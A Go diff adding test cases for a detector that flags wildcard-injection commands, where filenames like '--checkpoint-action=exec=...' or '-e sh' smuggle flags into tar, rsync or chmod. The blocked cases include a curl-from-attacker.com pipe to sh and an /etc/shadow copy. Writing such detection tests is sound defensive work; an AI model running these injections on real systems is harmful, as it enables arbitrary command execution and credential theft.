@@ -2246,6 +2246,171 @@ var HomeRedirectCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Wildcard Injection via Filename-to-Flag Expansion
+// Taxonomy: privilege-escalation/command-execution/wildcard-injection
+//
+// Creating files whose names match CLI flags (--checkpoint-action=exec=...).
+// When tar/rsync/chmod uses *, glob expansion turns filenames into arguments,
+// achieving arbitrary command execution. CWE-88, MITRE T1059.004.
+// ---------------------------------------------------------------------------
+
+// WildcardInjectionCases tests detection of wildcard/glob injection attacks.
+var WildcardInjectionCases = []TestCase{
+
+	// --- TRUE POSITIVES: tar checkpoint-action injection ---
+
+	{
+		ID:               "TP-WILDCARD-CHKPT-001",
+		Command:          `touch -- '--checkpoint-action=exec=sh payload.sh'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch creating --checkpoint-action file — classic tar wildcard injection",
+		Tags:             []string{"tp", "wildcard-injection", "tar"},
+	},
+	{
+		ID:               "TP-WILDCARD-CHKPT-002",
+		Command:          `touch -- '--checkpoint=1'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch creating --checkpoint=1 marker file — enables checkpoint-action execution",
+		Tags:             []string{"tp", "wildcard-injection", "tar"},
+	},
+	{
+		ID:               "TP-WILDCARD-CHKPT-003",
+		Command:          `echo > '--checkpoint-action=exec=curl attacker.com/shell.sh|sh'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "echo redirect creating checkpoint-action file with curl payload",
+		Tags:             []string{"tp", "wildcard-injection", "tar", "exfil"},
+	},
+	{
+		ID:               "TP-WILDCARD-CHKPT-004",
+		Command:          `touch -- '--checkpoint-action=exec=python3 -c "import os;os.system(\"id\")"'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "checkpoint-action with python interpreter execution",
+		Tags:             []string{"tp", "wildcard-injection", "tar"},
+	},
+	{
+		ID:               "TP-WILDCARD-CHKPT-005",
+		Command:          `printf > '--checkpoint-action=exec=/bin/bash -c "cat /etc/shadow > /tmp/s"'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "printf redirect creating checkpoint-action file targeting /etc/shadow",
+		Tags:             []string{"tp", "wildcard-injection", "tar"},
+	},
+
+	// --- TRUE POSITIVES: rsync -e shell injection ---
+
+	{
+		ID:               "TP-WILDCARD-RSYNC-001",
+		Command:          `touch -- '-e sh payload.sh'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch creating -e sh file — rsync wildcard injection specifying remote shell",
+		Tags:             []string{"tp", "wildcard-injection", "rsync"},
+	},
+	{
+		ID:               "TP-WILDCARD-RSYNC-002",
+		Command:          `echo > '-e sh reverse.sh'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "echo redirect creating -e sh file for rsync shell injection",
+		Tags:             []string{"tp", "wildcard-injection", "rsync"},
+	},
+
+	// --- TRUE POSITIVES: --reference= injection ---
+
+	{
+		ID:               "TP-WILDCARD-REF-001",
+		Command:          `touch -- '--reference=/etc/shadow'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch creating --reference=/etc/shadow file — chmod/chown permission copy injection",
+		Tags:             []string{"tp", "wildcard-injection", "chmod"},
+	},
+	{
+		ID:               "TP-WILDCARD-REF-002",
+		Command:          `touch -- '--reference=/etc/passwd'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch creating --reference=/etc/passwd file",
+		Tags:             []string{"tp", "wildcard-injection", "chmod"},
+	},
+
+	// --- TRUE NEGATIVES: legitimate file operations ---
+
+	{
+		ID:               "TN-WILDCARD-CHKPT-001",
+		Command:          `touch README.md CHANGELOG.md`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch creating normal files — no injection",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-WILDCARD-CHKPT-002",
+		Command:          `tar cf archive.tar -- file1.txt file2.txt`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "tar with explicit files and -- separator — safe",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-WILDCARD-CHKPT-003",
+		Command:          `echo "checkpoint reached" > status.log`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "echo with word 'checkpoint' in content — not a flag-shaped filename",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-WILDCARD-CHKPT-004",
+		Command:          `rsync -avz --exclude='*.log' src/ dest/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "normal rsync with exclude flag — not wildcard injection",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-WILDCARD-CHKPT-005",
+		Command:          `touch -- --help`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "privilege-escalation/command-execution/wildcard-injection",
+		Analyzer:         "regex",
+		Description:      "touch --help — harmless flag-looking filename",
+		Tags:             []string{"tn", "safe"},
+	},
+}
+
 // AllPrivilegeEscalationCases returns all test cases for Kingdom 5.
 func AllPrivilegeEscalationCases() []TestCase {
 	var all []TestCase
@@ -2270,5 +2435,6 @@ func AllPrivilegeEscalationCases() []TestCase {
 	all = append(all, DebugfsCases...)
 	all = append(all, RuntimeCodeInjectCases...)
 	all = append(all, HomeRedirectCases...)
+	all = append(all, WildcardInjectionCases...)
 	return all
 }
